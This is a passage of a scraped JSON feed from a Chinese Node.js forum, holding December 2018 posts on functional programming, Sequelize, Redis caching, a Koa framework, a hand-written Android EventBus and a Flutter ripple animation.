获得了最后的参数，然后执行最终返回我们期望的数字。</p>\n<h3>Javascript的缺点</h3>\n<p>所有的库和语言增强都已经得到了Javascript 的发展，但它仍然面临着这样一个事实:它是一种强制性的语言，它试图为所有人提供所有的东西。</p>\n<p>大多数前端开发人员都不得不使用 Javascript，因为这旨浏览器也识别的语言。相反，它们使用不同的语言编写，然后编译，或者更准确地说，是把其它语言转换成 Javascript。</p>\n<p>CoffeeScript 是这类语言中最早的一批。目前，TypeScript 已经被 Angular2 采用，Babel可以将这类语言编译成 JavaScript，越来越多的开发者在项目中采用这种方式。</p>\n<p>但是这些语言都是从 Javascript 开始的，并且只稍微改进了一点。为什么不直接从纯函数语言转换到Javascript呢?</p>\n<h3>未来期盼</h3>\n<p>我们不可能知道未来会怎样，但我们可以做一些有根据的猜测。以下是作者的一些看法:</p>\n<ol>\n<li>能转换成 JavaScript 这类语言会有更加丰富及健壮。</li>\n<li>已有40多年历史的函数式编程思想将被重新发现，以解决我们当前的软件复杂性问题。</li>\n<li>目前的硬件，比如廉价的内存，快速的处理器，使得函数式技术普及成为可能。</li>\n<li>PU不会变快，但是内核的数量会持续增加。</li>\n<li>可变状态将被认为是复杂系统中最大的问题之一。</li>\n</ol>\n<p>希望这系列文章能帮助你更好容易更好帮助你理解函数式编程及优势，作者相信函数式编程是未来趋势，大家有时间可以多多了解，接着提升你们的技能，然后未来有更好的出路。</p>\n<p><strong>原文：</strong></p>\n<ol>\n<li>[<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…](<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>/so-you-want-to-be-a-functional-programmer-part-5-c70adc9cf56a)</li>\n<li>[<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…](<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>/so-you-want-to-be-a-functional-programmer-part-6-db502830403)</li>\n</ol>\n<p><strong>编辑中可能存在的bug没法实时知道，事后为了解决这些bug,花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具<a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p><strong>更多内容请关注公众号《大迁世界》！</strong></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"学会JavaScript函数式编程(第3部分)","last_reply_at":"2018-12-29T08:25:37.879Z","good":false,"top":false,"reply_count":0,"visit_count":751,"create_at":"2018-12-29T08:25:37.879Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c26e0f276c4964062a1ef4d","author_id":"5bf517a1e6481c5709f5de14","tab":"ask","content":"<div class=\"markdown-text\"><p>如同 问题 <a href=\"https://segmentfault.com/q/1010000010847150\">https://segmentfault.com/q/1010000010847150</a>  一样。\n<img src=\"//static.cnodejs.org/Fo4AWpGyJl30haq1NQ4p5q30Gr40\" alt=\"image.png\">\n怎么忽略掉 map表dptrule的内容？</p>\n</div>","title":"sequelize 关联表多对多查询 ，如何去除查询结果中的关联表信息","last_reply_at":"2018-12-29T07:33:17.378Z","good":false,"top":false,"reply_count":4,"visit_count":760,"create_at":"2018-12-29T02:50:26.004Z","author":{"loginname":"91hanbao","avatar_url":"https://avatars0.githubusercontent.com/u/15627199?v=4&s=120"}},{"id":"5c25d45f76c4964062a1eb6a","author_id":"580f166dcf18d0333412d19a","tab":"ask","content":"<div class=\"markdown-text\"><p>RT，请问一下在同时用mysql和redis的情况下，mysql做持久化数据存储，redis做缓存，每次增删改用mysql， 读用redis。请问一下怎么保证每一次增删改完了从redis读到的都是最新的数据？难道增删改都做一次mysql到redis的同步？还是单独发消息处理？请各位大佬不吝赐教，谢谢！</p>\n</div>","title":"Redis和Mysql数据一致性问题","last_reply_at":"2018-12-29T05:54:01.038Z","good":false,"top":false,"reply_count":10,"visit_count":1069,"create_at":"2018-12-28T07:44:31.554Z","author":{"loginname":"hewentaowx","avatar_url":"https://avatars2.githubusercontent.com/u/22340341?v=4&s=120"}},{"id":"5a98f166ce1c90bc44c445b9","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><p>基于在上一家公司的开发经验，沉淀而来的web框架。</p>\n<p>Kost 基于 Koa，使用 Typescript 编写，借鉴于 egg 的<strong>约定大于配置</strong>的思想以及 nest 的依赖注入和装饰器路由。</p>\n<p>是一款内置多个功能，并遵循一系列规范的 Web 框架。</p>\n<h3>框架架构</h3>\n<p><img src=\"https://raw.githubusercontent.com/axetroy/kost/master/kost.png\" alt=\"kost\"></p>\n<h2>Q &amp; A</h2>\n<p>Q: 为什么开发这样的框架</p>\n<blockquote>\n<p>A: 框架基于以前的项目经验沉淀而来，首先是坚持 Typescript 不动摇，能在开发阶段避免了很多 bug。</p>\n</blockquote>\n<p>Q: 为什么不使用 nest？</p>\n<blockquote>\n<p>A: 因为它是基于 Express，而我以前的项目都是 Typescript + Koa</p>\n</blockquote>\n<p>Q: 为什么不使用 egg?</p>\n<blockquote>\n<p>A: egg 使用 JS 开发，目前对 Typescript 没有一个很好的方案(见识短，没发现)，而且 egg 的 service 会丢失类型 IDE 提示，目前 egg 成员已在着手解决这个问题，期待中…</p>\n</blockquote>\n<p>Q: 与两者的框架区别在哪里?</p>\n<blockquote>\n<p>A: 借鉴了 egg 的约定大于配置的思想，约定了一些文件目录，文件名，如果不按照框架写，就会 boom。借鉴了 nest 的 OOP 编程思想，所有的，包括 Controller、Service、Middleware 都是类，都可以进行依赖注入，而且路由定义是装饰器风格，语法糖会让你更加的直观。对于开发而言，会有很好的 IDE 提示。</p>\n</blockquote>\n<p>Q: 框架内置了一些特性，会不会平白增加性能负担？</p>\n<blockquote>\n<p>A: 根据你是否开启特性，来决定是否引入包，所以不会有性能损耗。</p>\n</blockquote>\n<p>Q: 是否需要配套 CLI 工具?</p>\n<blockquote>\n<p>A: 目前没有，编译成 JS 就能运行，可以用 pm2 进行负载均衡。</p>\n</blockquote>\n<p>Q: 框架是否包含进程管理?</p>\n<blockquote>\n<p>A: 框架本身不进行进程管理，没有类似 egg 的 master 主进程管理子进程，没有 agent</p>\n</blockquote>\n<h2>何为开源</h2>\n<p>开源就是自己用的爽的东西，拿出来给大家用，然后发现你自己写的，用法和原理你肯定懂啊，但是别人不懂，你得写文档，维护文档的时间，不必写代码的时间少。</p>\n<p>同时为了保证项目质量，你还得写测试用例，写测试用例的时间，也并不少。</p>\n<p>要维护一个开源项目，真的是要花不少心思，向开源大牛致敬。</p>\n<h2>总结</h2>\n<p>实现起来没什么难度，前人栽树，后人乘凉，继承自Koa的类，然后在start之前，做一些初始化动作，加载Controller，验证Controller、Middleware、Service是否正确，加载配置文件等工作…</p>\n<p>从创建仓库到现在100+个commit，而大多数commit都是更新文档，添加测试用例，最近也忙，断断续续的维护，今天终于完善了测试用例，覆盖率99%，终于可以发布第一个版本。</p>\n<p>有兴趣的小伙伴，一起来维护吗，交个朋友</p>\n<p>最后上项目地址: <a href=\"https://github.com/axetroy/kost\">https://github.com/axetroy/kost</a></p>\n</div>","title":"一个装饰器风格，依赖注入，OOP的Web框架","last_reply_at":"2018-12-29T05:51:23.180Z","good":false,"top":false,"reply_count":14,"visit_count":2498,"create_at":"2018-03-02T06:38:30.463Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c26f2c33898674067a7985e","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>事件总线核心逻辑的实现。</p>\n<p>&lt;!–more–&gt;</p>\n<h1>EventBus的作用</h1>\n<p>Android中存在各种通信场景，如<code>Activity</code>之间的跳转，<code>Activity</code>与<code>Fragment</code>以及其他组件之间的交互，以及在某个耗时操作（如请求网络）之后的callback回调等，互相之之间往往需要持有对方的引用，每个场景的写法也有差异，导致耦合性较高且不便维护。以<code>Activity</code>和<code>Fragment</code>的通信为例，官方做法是实现一个接口，然后持有对方的引用，再强行转成接口类型，导致耦合度偏高。再以<code>Activity</code>的返回为例，一方需要设置<code>setResult</code>，而另一方需要在<code>onActivityResult</code>做对应处理，如果有多个返回路径，代码就会十分臃肿。而<code>SimpleEventBus</code>（本文最终实现的简化版事件总线）的写法如下：</p>\n<pre class=\"prettyprint language-java\"><code>\npublic class MainActivity extends AppCompatActivity {\n\n    TextView mTextView;\n\n    @Override\n\n    protected void onCreate(Bundle savedInstanceState) {\n\n        super.onCreate(savedInstanceState);\n\n        setContentView(R.layout.activity_main);\n\n        mTextView = findViewById(R.id.tv_demo);\n\n        mTextView.setText(&quot;MainActivity&quot;);\n\n        mTextView.setOnClickListener(new View.OnClickListener() {\n\n            @Override\n\n            public void onClick(View view) {\n\n                Intent intent = new Intent(MainActivity.this, SecondActivity.class);\n\n                startActivity(intent);\n\n            }\n\n        });\n\n        EventBus.getDefault().register(this);\n\n    }\n\n    @Subscribe(threadMode = ThreadMode.MAIN)\n\n    public void onReturn(Message message) {\n\n        mTextView.setText(message.mContent);\n\n    }\n\n    @Override\n\n    protected void onDestroy() {\n\n        super.onDestroy();\n\n        EventBus.getDefault().unregister(this);\n\n    }\n\n}\n\n</code></pre><p>来源<code>Activity</code>：</p>\n<pre class=\"prettyprint language-java\"><code>\npublic class SecondActivity extends AppCompatActivity {\n\n    TextView mTextView;\n\n    @Override\n\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n\n        super.onCreate(savedInstanceState);\n\n        setContentView(R.layout.activity_main);\n\n        mTextView = findViewById(R.id.tv_demo);\n\n        mTextView.setText(&quot;SecondActivity,点击返回&quot;);\n\n        mTextView.setOnClickListener(new View.OnClickListener() {\n\n            @Override\n\n            public void onClick(View view) {\n\n                Message message = new Message();\n\n                message.mContent = &quot;从SecondActivity返回&quot;;\n\n                EventBus.getDefault().post(message);\n\n                finish();\n\n            }\n\n        });\n\n    }\n\n}\n\n</code></pre><p>效果如下：</p>\n<p><img src=\"https://github.com/vimerzhao/images/raw/master/2018-12/eventbus-demo.gif\" alt></p>\n<p>似乎只是换了一种写法，但在场景愈加复杂后，<code>EventBus</code>能够体现出更好的解耦能力。</p>\n<h1>背景知识</h1>\n<p>主要涉及三方面的知识：</p>\n<ol>\n<li>\n<p>观察者模式(or 发布-订阅模式)</p>\n</li>\n<li>\n<p>Android消息机制</p>\n</li>\n<li>\n<p>Java并发编程</p>\n</li>\n</ol>\n<p>本文可以认为是<a href=\"https://github.com/greenrobot/EventBus\">greenrobot/EventBus</a>这个开源库的源码阅读指南，笔者在看设计模式相关书籍的时候了解到这个库，觉得有必要实现一下核心功能以加深理解。</p>\n<h1>实现过程</h1>\n<p><code>EventBus</code>的使用分三个步骤：注册监听、发送事件和取消监听，相应本文也将分这三步来实现。</p>\n<h2>注册监听</h2>\n<p>定义一个注解：</p>\n<pre class=\"prettyprint\"><code>\n@Retention(RetentionPolicy.RUNTIME)\n\n@Target(ElementType.METHOD)\n\npublic @interface Subscribe {\n\n    ThreadMode threadMode() default ThreadMode.POST;\n\n}\n\n</code></pre><p><code>greenrobot/EventBus</code>还支持优先级和粘性事件，这里只支持最基本的能力：区分线程，因为如更新UI的操作必须放在主线程。<code>ThreadMode</code>如下：</p>\n<pre class=\"prettyprint\"><code>\npublic enum ThreadMode {\n\n    MAIN, &#x2F;&#x2F; 主线程\n\n    POST, &#x2F;&#x2F; 发送消息的线程\n\n    ASYNC &#x2F;&#x2F; 新开一个线程发送\n\n}\n\n</code></pre><p>在对象初始化的时候，使用<code>register</code>方法注册，该方法会解析被注册对象的所有方法，并解析声明了注解的方法（即观察者），核心代码如下：</p>\n<pre class=\"prettyprint\"><code>\npublic class EventBus {\n\n    ...\n\n    public void register(Object subscriber) {\n\n        if (subscriber == null) {\n\n            return;\n\n        }\n\n        synchronized (this) {\n\n            subscribe(subscriber);\n\n        }\n\n    }\n\n    ...\n\n    private void subscribe(Object subscriber) {\n\n        if (subscriber == null) {\n\n            return;\n\n        }\n\n        &#x2F;&#x2F; TODO 巨踏马难看的缩进\n\n        Class&lt;?&gt; clazz = subscriber.getClass();\n\n        while (clazz != null &amp;&amp; !isSystemClass(clazz.getName())) {\n\n            final Method[] methods = clazz.getDeclaredMethods();\n\n            for (Method method : methods) {\n\n                Subscribe annotation = method.getAnnotation(Subscribe.class);\n\n                if (annotation != null) {\n\n                    Class&lt;?&gt;[] paramClassArray = method.getParameterTypes();\n\n                    if (paramClassArray != null &amp;&amp; paramClassArray.length == 1) {\n\n                        Class&lt;?&gt; paramType = convertType(paramClassArray[0]);\n\n                        EventType eventType = new EventType(paramType);\n\n                        SubscriberMethod subscriberMethod = new SubscriberMethod(method, annotation.threadMode(), paramType);\n\n                        realSubscribe(subscriber, subscriberMethod, eventType);\n\n                    }\n\n                }\n\n            }\n\n            clazz = clazz.getSuperclass();\n\n        }\n\n    }\n\n    ...\n\n    private void realSubscribe(Object subscriber, SubscriberMethod method, EventType eventType) {\n\n        CopyOnWriteArrayList&lt;Subscription&gt; subscriptions = mSubscriptionsByEventtype.get(subscriber);\n\n        if (subscriptions == null) {\n\n            subscriptions = new CopyOnWriteArrayList&lt;&gt;();\n\n        }\n\n        Subscription subscription = new Subscription(subscriber, method);\n\n        if (subscriptions.contains(subscription)) {\n\n            return;\n\n        }\n\n        subscriptions.add(subscription);\n\n        mSubscriptionsByEventtype.put(eventType, subscriptions);\n\n    }\n\n    ...\n\n}\n\n</code></pre><p>执行过这些逻辑后，该对象所有的观察者方法都会被存在一个Map中，其Key是<code>EventType</code>，即观察事件的类型，Value是订阅了该类型事件的所有方法（即观察者）的一个列表，每个方法和对象一起封装成了一个<code>Subscription</code>类：</p>\n<pre class=\"prettyprint\"><code>\npublic class Subscription {\n\n    public final Reference&lt;Object&gt; subscriber;\n\n    public final SubscriberMethod subscriberMethod;\n\n    public Subscription(Object subscriber, \n\n                        SubscriberMethod subscriberMethod) {\n\n        this.subscriber = new WeakReference&lt;&gt;(subscriber);&#x2F;&#x2F; EventBus3 没用弱引用?\n\n        this.subscriberMethod = subscriberMethod;\n\n    }\n\n    @Override\n\n    public int hashCode() {\n\n        return subscriber.hashCode() + subscriberMethod.methodString.hashCode();\n\n    }\n\n    @Override\n\n    public boolean equals(Object obj) {\n\n        if (obj instanceof Subscription) {\n\n            Subscription other = (Subscription) obj;\n\n            return subscriber == other.subscribe\n\n                    &amp;&amp; subscriberMethod.equals(other.subscriberMethod);\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n}\n\n</code></pre><p>如此，便是注册监听方法的核心逻辑了。</p>\n<h2>消息发送</h2>\n<p>消息的发送代码很简单：</p>\n<pre class=\"prettyprint\"><code>\npublic class EventBus {\n\n    ...\n\n    private EventDispatcher mEventDispatcher = new EventDispatcher();\n\n    private ThreadLocal&lt;Queue&lt;EventType&gt;&gt; mThreadLocalEvents = new ThreadLocal&lt;Queue&lt;EventType&gt;&gt;() {\n\n        @Override\n\n        protected Queue&lt;EventType&gt; initialValue() {\n\n            return new ConcurrentLinkedQueue&lt;&gt;();\n\n        }\n\n    };\n\n    ...\n\n    public void post(Object message) {\n\n        if (message == null) {\n\n            return;\n\n        }\n\n        mThreadLocalEvents.get().offer(new EventType(message.getClass()));\n\n        mEventDispatcher.dispatchEvents(message);\n\n    }\n\n    ...\n\n}\n\n</code></pre><p>比较复杂一点的是需要根据注解声明的线程模式在对应的线程进行发布：</p>\n<pre class=\"prettyprint\"><code>\npublic class EventBus {\n\n    ...\n\n    private class EventDispatcher {\n\n        private IEventHandler mMainEventHandler = new MainEventHandler();\n\n        private IEventHandler mPostEventHandler = new DefaultEventHandler();\n\n        private IEventHandler mAsyncEventHandler = new AsyncEventHandler();\n\n        void dispatchEvents(Object message) {\n\n            Queue&lt;EventType&gt; eventQueue = mThreadLocalEvents.get();\n\n            while (eventQueue.size() &gt; 0) {\n\n                handleEvent(eventQueue.poll(), message);\n\n            }\n\n        }\n\n        private void handleEvent(EventType eventType, Object message) {\n\n            List&lt;Subscription&gt; subscriptions = mSubscriptionsByEventtype.get(eventType);\n\n            if (subscriptions == null) {\n\n                return;\n\n            }\n\n            for (Subscription subscription : subscriptions) {\n\n                IEventHandler eventHandler =  getEventHandler(subscription.subscriberMethod.threadMode);\n\n                eventHandler.handleEvent(subscription, message);\n\n            }\n\n        }\n\n        private IEventHandler getEventHandler(ThreadMode mode) {\n\n            if (mode == ThreadMode.ASYNC) {\n\n                return mAsyncEventHandler;\n\n            }\n\n            if (mode == ThreadMode.POST) {\n\n                return mPostEventHandler;\n\n            }\n\n            return mMainEventHandler;\n\n        }\n\n    }&#x2F;&#x2F; end of the class\n\n    ...\n\n}\n\n</code></pre><p>三种线程模式分别如下，<code>DefaultEventHandler</code>（在发布线程执行观察者放方法）：</p>\n<pre class=\"prettyprint\"><code>\npublic class DefaultEventHandler implements IEventHandler {\n\n    @Override\n\n    public void handleEvent(Subscription subscription, Object message) {\n\n        if (subscription == null || subscription.subscriber.get() == null) {\n\n            return;\n\n        }\n\n        try {\n\n            subscription.subscriberMethod.method.invoke(subscription.subscriber.get(), message);\n\n        } catch (IllegalAccessException | InvocationTargetException e) {\n\n            e.printStackTrace();\n\n        }\n\n    }\n\n}\n\n</code></pre><p><code>MainEventHandler</code>（在主线程执行）：</p>\n<pre class=\"prettyprint\"><code>\npublic class MainEventHandler implements IEventHandler {\n\n    private Handler mMainHandler = new Handler(Looper.getMainLooper());\n\n    DefaultEventHandler hanlder = new DefaultEventHandler();\n\n    @Override\n\n    public void handleEvent(final Subscription subscription, final Object message) {\n\n        mMainHandler.post(new Runnable() {\n\n            @Override\n\n            public void run() {\n\n                hanlder.handleEvent(subscription, message);\n\n            }\n\n        });\n\n    }\n\n}\n\n</code></pre><p><code>AsyncEventHandler</code>（新开一个线程执行）：</p>\n<pre class=\"prettyprint\"><code>\npublic class AsyncEventHandler implements IEventHandler {\n\n    private DispatcherThread mDispatcherThread;\n\n    private IEventHandler mEventHandler = new DefaultEventHandler();\n\n    public AsyncEventHandler() {\n\n        mDispatcherThread = new DispatcherThread(AsyncEventHandler.class.getSimpleName());\n\n        mDispatcherThread.start();\n\n    }\n\n    @Override\n\n    public void handleEvent(final Subscription subscription, final Object message) {\n\n        mDispatcherThread.post(new Runnable() {\n\n            @Override\n\n            public void run() {\n\n                mEventHandler.handleEvent(subscription, message);\n\n            }\n\n        });\n\n    }\n\n    private class DispatcherThread extends HandlerThread {\n\n        &#x2F;&#x2F; 关联了AsyncExecutor消息队列的Handle\n\n        Handler mAsyncHandler;\n\n        DispatcherThread(String name) {\n\n            super(name);\n\n        }\n\n        public void post(Runnable runnable) {\n\n            if (mAsyncHandler == null) {\n\n                throw new NullPointerException(&quot;mAsyncHandler == null, please call start() first.&quot;);\n\n            }\n\n            mAsyncHandler.post(runnable);\n\n        }\n\n        @Override\n\n        public synchronized void start() {\n\n            super.start();\n\n            mAsyncHandler = new Handler(this.getLooper());\n\n        }\n\n    }\n\n}\n\n</code></pre><p>以上便是发布消息的代码。</p>\n<h2>注销监听</h2>\n<p>最后一个对象被销毁还要注销监听，否则容易导致内存泄露，目前<code>SimpleEventBus</code>用的是<code>WeakReference</code>，能够通过GC自动回收，但不知道<code>greenrobot/EventBus</code>为什么没这样实现，待研究。注销监听其实就是遍历Map，拿掉该对象的订阅即可：</p>\n<pre class=\"prettyprint\"><code>\npublic class EventBus {\n\n    ...\n\n    public void unregister(Object subscriber) {\n\n        if (subscriber == null) {\n\n            return;\n\n        }\n\n        Iterator&lt;CopyOnWriteArrayList&lt;Subscription&gt;&gt; iterator = mSubscriptionsByEventtype.values().iterator();\n\n        while (iterator.hasNext()) {\n\n            CopyOnWriteArrayList&lt;Subscription&gt; subscriptions = iterator.next();\n\n            if (subscriptions != null) {\n\n                List&lt;Subscription&gt; foundSubscriptions = new LinkedList&lt;&gt;();\n\n                for (Subscription subscription : subscriptions) {\n\n                    Object cacheObject = subscription.subscriber.get();\n\n                    if (cacheObject == null || cacheObject.equals(subscriber)) {\n\n                        foundSubscriptions.add(subscription);\n\n                    }\n\n                }\n\n                subscriptions.removeAll(foundSubscriptions);\n\n            }\n\n            &#x2F;&#x2F; 如果针对某个Event的订阅者数量为空了,那么需要从map中清除\n\n            if (subscriptions == null || subscriptions.size() == 0) {\n\n                iterator.remove();\n\n            }\n\n        }\n\n    }\n\n    ...\n\n}\n\n</code></pre><p>以上便是事件总线最核心部分的代码实现，完整代码见<a href=\"https://github.com/vimerzhao/SimpleEventBus\">vimerzhao/SimpleEventBus</a>，后面发现问题更新或者进行升级也只会改动仓库的代码。</p>\n<h1>局限性</h1>\n<p>由于时间关系，目前只研究了<code>EventBus</code>的核心部分，还有几个值得深入研究的点，在此记录一下，也欢迎路过的大牛指点一二。</p>\n<h2>性能问题</h2>\n<p>实际使用时，注解和反射会导致性能问题，但<code>EventBus3</code>已经通过<code>Subscriber Index</code>基本解决了这一问题，实现也非常有意思，是通过注解处理器（<code>Annotation Processor</code>）把耗时的逻辑从运行期提前到了编译期，通过编译期生成的索引来给运行期提速，这也是这个名字的由来。</p>\n<h2>可用性问题</h2>\n<p>如果订阅者很多会不会影响体验，毕竟原始的方法是点对点的消息传递，不会有这种问题，如果部分订阅者尚未初始化怎么办。等等。目前<code>EventBus3</code>提供了优先级和粘性事件的属性来进一步满足开发需求。但是否彻底解决问题了还有待验证。</p>\n<h2>跨进程问题</h2>\n<p><code>EventBus</code>是进程内的消息管理机制，并且从开源社区的反馈来看这个项目是非常成功的，但稍微有点体量的APP都做了进程拆分，所以是否有必要支持多进程，能否在保证性能的情况下提供同等的代码解耦能力，也值得继续挖掘。目前有<a href=\"https://github.com/lsxiao/Apollo\">lsxiao/Apollo</a>和<a href=\"https://github.com/Xiaofei-it/HermesEventBus\">Xiaofei-it/HermesEventBus</a>等可供参考。</p>\n<h1>参考</h1>\n<ul>\n<li>\n<p><a href=\"https://github.com/greenrobot/EventBus\">greenrobot/EventBus</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/hehonghui/AndroidEventBus\">hehonghui/AndroidEventBus</a></p>\n</li>\n<li>\n<p>《Android开发艺术探索》第十章</p>\n</li>\n</ul>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"自己动手写事件总线(EventBus)","last_reply_at":"2018-12-29T05:44:44.333Z","good":false,"top":false,"reply_count":1,"visit_count":651,"create_at":"2018-12-29T04:06:27.949Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c26dd4876c4964062a1ef20","author_id":"59e40e1620a1a3647d72ac43","tab":"ask","content":"<div class=\"markdown-text\"><p>代码大概是这样子的</p>\n<p>环境：\nwin64</p>\n<p>场景：\n已经有一个进程了，我想在这个进程之上启动一个exe程序(一个windows的安装程序)，可是当我使用exec直接运行这个exe可执行程序文件时，下面直接退出父进程，子进程也起不起来，我已经detached了》</p>\n<p>代码：\n``javascript`\nexec(’*****.exe’,{detached: true});\nprocess.exit</p>\n<pre class=\"prettyprint\"><code>\n我运行的exe是一个win安装的执行程序，所以不能等进程退出之后再去退出父进程，如果添加回调就比想要的效果晚了，我是想&#96;启动起来&#96; 之后就exit。\n\n大致就是这样子的，官网上面说，detached是一个独立的进程运行，是不是因为衍生shell是异步的，所以还没启动子进程的时候，我就已经exit了？\n\n我是新手，希望大家多多指点</code></pre></div>","title":"子进程detached之后，父进程退出依旧启动不起来","last_reply_at":"2018-12-29T02:34:48.779Z","good":false,"top":false,"reply_count":0,"visit_count":618,"create_at":"2018-12-29T02:34:48.779Z","author":{"loginname":"TongDaDa","avatar_url":"https://avatars1.githubusercontent.com/u/23241188?v=4&s=120"}},{"id":"5c26478876c4964062a1eddf","author_id":"57346bbf32bf2c90579f529f","tab":"ask","content":"<div class=\"markdown-text\"><p>谷歌浏览器请求效果如下：\n<img src=\"//static.cnodejs.org/FngIobEakq-_ZvlEAVWvQL-S9XH0\" alt=\"QQ截图20181228234848.png\"></p>\n<p>postman请求如下：\n<img src=\"//static.cnodejs.org/Ftk7DYSvXgfpUg0NKY3aenxNvOoZ\" alt=\"QQ截图20181228234901.png\"></p>\n<p>下面是代码：\n先是路由过来：\napp.post(’/addScore’,Score.addScore);\n添加数据逻辑：\n<img src=\"//static.cnodejs.org/FhGtiWLovnmjh3-A78-eDbgEQqf9\" alt=\"QQ截图20181228235053.png\"></p>\n<p>webstrom输出：\n<img src=\"//static.cnodejs.org/FmiTzxq_2tqgUlFsMAyNsO0lTJ3k\" alt=\"QQ截图20181228235516.png\"></p>\n</div>","title":"关于express写请求接口的时候，直接会卡死，谷歌浏览器一直在pending，postman也不行。","last_reply_at":"2018-12-28T16:18:09.072Z","good":false,"top":false,"reply_count":1,"visit_count":767,"create_at":"2018-12-28T15:55:52.927Z","author":{"loginname":"dpc761218914","avatar_url":"https://avatars3.githubusercontent.com/u/16233212?v=4&s=120"}},{"id":"5c1afdba76c4964062a1b9c6","author_id":"5c1afbfd3898674067a7639e","tab":"ask","content":"<div class=\"markdown-text\"><p>刚接触node.js。还望大手指导一二，感谢。\n最近在做一个物联网的项目，通过手机端小程序、PC端网页发送指令控制设备，主要就是这样的一件事。下面是构思的流程图。我用node.js分别创建了一个tcp server（net）和一个websocket server（<a href=\"http://socket.io\">socket.io</a>）服务器，现在卡在tcp server与websocket server通信上。请教各位大手可有思路或demo可以提供给我参考一下，再次感谢。\n<img src=\"//static.cnodejs.org/Fu9RuDe5qaqeJ2_jzQeFWLRHAcTL\" alt=\"flow.png\"></p>\n</div>","title":"node.js创建的tcp server与websocket server如何进行通信？","last_reply_at":"2018-12-28T13:14:43.913Z","good":false,"top":false,"reply_count":4,"visit_count":939,"create_at":"2018-12-20T02:26:02.313Z","author":{"loginname":"chengquan223","avatar_url":"https://avatars2.githubusercontent.com/u/15673705?v=4&s=120"}},{"id":"5c24a6513898674067a7902b","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<h2>目的</h2>\n<p>写了几个Flutter的demo，但是对Flutter的自定义view和动画都不太了解，看到一个类似效果在android的实现，就尝试用Flutter做一下。同时也是学习Flutter的自定义view和动画相关的知识。</p>\n<h2>效果</h2>\n<p><img src=\"https://ask.qcloudimg.com/draft/1342840/6hsrzt772a.gif\" alt=\"img\">效果动图</p>\n<p>在蓝色区域点击，会产品水波纹动画。</p>\n<blockquote>\n<p>宛如水珠落在池塘，雨滴落在青青草地~</p>\n</blockquote>\n<h2>思路</h2>\n<p>动画很简单，虽然有多个雨滴，不过每次点击都是重复的动画，所以只用管一个雨滴动画是怎么实现的，其他的都是重复。</p>\n<p>单独来看一个雨滴动画，其实就是一个圆圈慢慢的变大同时慢慢的变浅，最后消失。</p>\n<p>所以我们封装一套上述的动画逻辑，然后在用户每次点击时生成一个相应的动画即可。</p>\n<h2>实现</h2>\n<h3>自定义view</h3>\n<p>首先我们要解决的是自定义view的问题，我们知道Flutter中的一起UI皆Flutter，但是不同于android中的View会直接提供一个draw方法让你做自由的绘制操作。在Flutter中，除了StatefuleWidget等申明了支持继承的类外，其他的都是不建议继承重写的。如要要做一个新的Widget，官方建议是通过组合Widget来实现。</p>\n<p>当然对于我们这里这种需要自己做绘制操作的，就不是组合可以解决的了，这种情况下，Flutter提供了<code>CustomPainter</code>类，这个类提供了paint方法，可以通过重写该方法，实现对canvas的绘制。然后作为<code>CustomPaint</code>的参数，控制该Widget的展示样式。</p>\n<p>这里由于主要的绘制是水纹，要实现多个重复动画，所以具体的绘制逻辑封装了起来</p>\n<pre class=\"prettyprint language-js\"><code>class RainDrop extends CustomPainter {\n  RainDrop(this.rainList);\n\n  List&lt;RainDropDrawer&gt; rainList = List(); &#x2F;&#x2F; 雨点列表\n  Paint _paint = new Paint()..style = PaintingStyle.stroke; &#x2F;&#x2F; 配置画笔\n\n  @override\n  void paint(Canvas canvas, Size size) {\n    rainList.forEach((item) {\n      item.drawRainDrop(canvas, _paint); &#x2F;&#x2F; 实际的绘制逻辑\n    });\n    rainList.removeWhere((item) { &#x2F;&#x2F; 移出无效对象\n      return !item.isValid();\n    });\n  }\n  &#x2F;&#x2F; ...\n}\n</code></pre><h3>水纹圈的绘制</h3>\n<p>每一个水纹的动画都是一样的，所以统一封装了起来。</p>\n<pre class=\"prettyprint language-js\"><code>class RainDropDrawer {\n  static const double MAX_RADIUS = 30;\n  double posX;\n  double posY;\n  double radius = 5;\n\n  RainDropDrawer(this.posX, this.posY); &#x2F;&#x2F; (2)\n\n  drawRainDrop(Canvas canvas, Paint paint) { &#x2F;&#x2F; (1)\n    double opt = (MAX_RADIUS - radius) &#x2F; MAX_RADIUS; &#x2F;&#x2F; (3)\n    paint.color = Color.fromRGBO(0, 0, 0, opt);\n    canvas.drawCircle(Offset(posX, posY), radius, paint); &#x2F;&#x2F; (4)\n    radius += 0.5;\n  }\n\n  bool isValid() { &#x2F;&#x2F; (5)\n    return radius &lt; MAX_RADIUS;\n  